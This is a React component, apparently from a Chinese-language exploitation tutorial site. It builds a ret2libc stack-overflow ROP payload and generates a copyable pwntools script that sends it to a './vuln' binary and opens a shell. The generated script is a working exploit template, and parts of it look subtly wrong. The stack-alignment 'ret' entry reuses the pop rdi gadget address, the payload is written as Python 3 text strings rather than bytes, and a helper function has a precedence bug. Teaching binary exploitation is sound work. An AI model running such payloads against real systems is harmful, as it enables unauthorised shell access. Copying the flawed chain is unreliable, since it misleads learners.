'use client';

import { useMemo, useState } from 'react';

/**
 * Payload 构造器 —— 栈溢出场景。
 * 实时拼 ASCII payload 布局 + 生成 Python pwntools 模板 + 复制。
 */

interface Props {
  label?: string;
  defaults?: {
    offset?: number;
    gadgetRdi?: string;
    binshAddr?: string;
    systemAddr?: string;
    retPadding?: boolean;
  };
}

function p64(h: string): string {
  const hex = h.replace(/^0x/, '');
  const bytes: string[] = [];
  for (let i = hex.length; i > 0; i -= 2) bytes.push('\\x' + hex.slice(i - 2, i).padStart(2, '0'));
  while (bytes.length < 8) bytes.push('\\x00');
  return bytes.join('');
}

function hexFromP64(p64: string): string {
  // 把 "\x96\x11\x40\x00..." 还原回 0x401196（小端逆序）
  const parts = p64.match(/\\x([0-9a-f]{2})/gi);
  if (!parts) return '0x0';
  const clean = parts.map((m) => m.replace(/\\x/i, '')).reverse().join('');
  return '0x' + clean.replace(/^0+/, '') || '0x0';
}

export default function PayloadBuilder({ label = '栈溢出 payload', defaults }: Props) {
  const [offset, setOffset] = useState<number>(defaults?.offset ?? 72);
  const [gadgetRdi, setGadgetRdi] = useState<string>(defaults?.gadgetRdi ?? '0x401196');
  const [binshAddr, setBinshAddr] = useState<string>(defaults?.binshAddr ?? '0x7ffff7f5a0b5');
  const [systemAddr, setSystemAddr] = useState<string>(defaults?.systemAddr ?? '0x7ffff7e1e340');
  const [needRet, setNeedRet] = useState<boolean>(defaults?.retPadding ?? true);
  const [copied, setCopied] = useState(false);

  const rows = useMemo(() => {
    const r: [string, string, string][] = [
      ['padding', String(offset).padStart(4), 'A'.repeat(Math.min(32, offset)) + (offset > 32 ? '…' : '')],
      ['pop rdi; ret', gadgetRdi.padEnd(16), p64(gadgetRdi)],
      ['"/bin/sh"', binshAddr.padEnd(16), p64(binshAddr)],
    ];
    if (needRet) r.push(['ret (对齐)', gadgetRdi.padEnd(16), p64(gadgetRdi)]);
    r.push(['system()', systemAddr.padEnd(16), p64(systemAddr)]);
    r.push(['exit()', '0x401060'.padEnd(16), p64('0x401060')]);
    return r;
  }, [offset, gadgetRdi, binshAddr, systemAddr, needRet]);

  const asciiDiagram = rows.map((r) =>
    `  ${r[0].padEnd(16)} ${r[1]}   ${r[2]}`
  ).join('\n');

  const pythonPayload = useMemo(() => {
    const gadgetP64 = p64(gadgetRdi);
    const binshP64 = p64(binshAddr);
    const sysP64 = p64(systemAddr);
    const exitP64 = p64('0x401060');
    const parts = [`"A" * ${offset}`, `"${gadgetP64}"`, `"${binshP64}"`];
    if (needRet) parts.push(`"${gadgetP64}"`);
    parts.push(`"${sysP64}"`, `"${exitP64}"`);
    return `#!/usr/bin/env python3
from pwn import *

# payload —— 地址用 ldd -s 校准后替换
payload = (
    ${parts.join(' +\\n    ')}
)

p = process('./vuln')
p.sendline(payload)
p.interactive()`;
  }, [offset, gadgetRdi, binshAddr, systemAddr, needRet]);

  const copy = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true); setTimeout(() => setCopied(false), 1200);
    } catch {
      const ta = document.createElement('textarea');
      ta.value = text; document.body.appendChild(ta); ta.select();
      try { document.execCommand('copy'); setCopied(true); setTimeout(() => setCopied(false), 1200); } catch {}
      document.body.removeChild(ta);
    }
  };

  return (
    <div className="space-y-5">
      <div className="flex items-center justify-between">
        <span className="font-mono text-[11px] tracking-wider text-[var(--text-soft)]">{label}</span>
        <span className="font-mono text-[10.5px] text-[var(--text-soft)]">
          偏移 {offset}B · {needRet ? '已对齐 ret' : '无 ret 对齐'}
        </span>
      </div>

      <div className="grid sm:grid-cols-2 gap-x-6 gap-y-3">
        <Field label="padding 长度" hint="cyclic -l 'AAAA...' 算出来的偏移">
          <input type="number" min={0} max={4096} value={offset} onChange={(e) => setOffset(Number(e.target.value) || 0)} className="field-input" />
        </Field>
        <Field label="pop rdi; ret gadget" hint="ROPgadget --binary vuln --only 'pop rdi|ret'">
          <input type="text" value={gadgetRdi} onChange={(e) => setGadgetRdi(e.target.value)} className="field-input font-mono" />
        </Field>
        <Field label="&quot;/bin/sh&quot; 地址" hint="libc 基址 + 字符串偏移">
          <input type="text" value={binshAddr} onChange={(e) => setBinshAddr(e.target.value)} className="field-input font-mono" />
        </Field>
        <Field label="system() 地址" hint="libc 基址 + system 偏移">
          <input type="text" value={systemAddr} onChange={(e) => setSystemAddr(e.target.value)} className="field-input font-mono" />
        </Field>
      </div>

      <label className="flex items-center gap-2 font-mono text-[12px] text-[var(--text-muted)] cursor-pointer select-none">
        <input type="checkbox" checked={needRet} onChange={(e) => setNeedRet(e.target.checked)} className="accent-[var(--brand-500)]" />
        加一个空 ret gadget 栈对齐（movaps 崩溃修复）
      </label>

      <div className="u-panel overflow-hidden">
        <div className="px-4 py-2.5 border-b border-[var(--border)] bg-[var(--bg-soft)] flex items-center justify-between">
          <span className="font-mono text-[11px] text-[var(--text-muted)]">ASCII 布局</span>
          <span className="font-mono text-[10px] text-[var(--text-soft)]">含义 · 地址 · 原始字节（小端）</span>
        </div>
        <pre className="m-0 px-4 py-3 font-mono text-[12px] text-[var(--text-muted)] whitespace-pre">{asciiDiagram}</pre>
      </div>

      <div className="u-panel overflow-hidden">
        <div className="px-4 py-2.5 border-b border-[var(--border)] bg-[var(--bg-soft)] flex items-center justify-between">
          <span className="font-mono text-[11px] text-[var(--text-muted)]">Python pwntools 模板</span>
          <button onClick={() => copy(pythonPayload)} className="font-mono text-[11px] px-2.5 py-1 rounded border border-[var(--border)] text-[var(--text-muted)] hover:text-[var(--text)] hover:bg-[var(--bg-hover)] transition-colors">
            {copied ? '✓ copied' : 'copy'}
          </button>
        </div>
        <pre className="m-0 px-4 py-3 font-mono text-[12px] text-[var(--text-muted)] whitespace-pre overflow-x-auto">{pythonPayload}</pre>
      </div>

      <style jsx>{`
        .field-input {
          width: 100%;
          padding: 7px 10px;
          background: var(--bg-card);
          border: 1px solid var(--border);
          border-radius: 4px;
          color: var(--text);
          font-size: 13px;
          outline: none;
          transition: border-color 0.15s ease;
        }
        .field-input:focus { border-color: var(--brand-500); }
      `}</style>
    </div>
  );
}

function Field({ label, hint, children }: { label: string; hint?: string; children: React.ReactNode }) {
  return (
    <div>
      <label className="block font-mono text-[11px] tracking-wider text-[var(--text-soft)] mb-1.5">{label}</label>
      {children}
      {hint && <p className="mt-1 font-mono text-[10.5px] text-[var(--text-soft)]">{hint}</p>}
    </div>
  );
}
